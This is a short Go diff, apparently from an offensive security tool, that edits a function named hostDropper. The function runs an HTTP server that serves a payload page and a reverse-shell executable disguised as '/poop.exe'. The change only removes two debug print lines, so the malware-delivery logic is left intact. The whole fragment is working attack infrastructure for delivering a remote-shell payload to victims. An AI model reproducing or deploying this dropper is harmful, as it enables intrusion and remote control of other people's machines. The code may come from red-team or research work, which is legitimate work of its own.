@@ -89,11 +89,9 @@ func generateRandomString(length int) string {
 func hostDropper(port, revshellpath string) {
 	println("[+] Hosting payload on port :" + port)
 	http.HandleFunc("/payload.html", func(w http.ResponseWriter, r *http.Request) {
-		print("a")
 		http.ServeFile(w, r, "tmp/payload.html")
 	})
 	http.HandleFunc("/poop.exe", func(w http.ResponseWriter, r *http.Request) {
-		println("'btdfr")
 		http.ServeFile(w, r, revshellpath)
 	})
 	http.ListenAndServe(":"+port, nil)
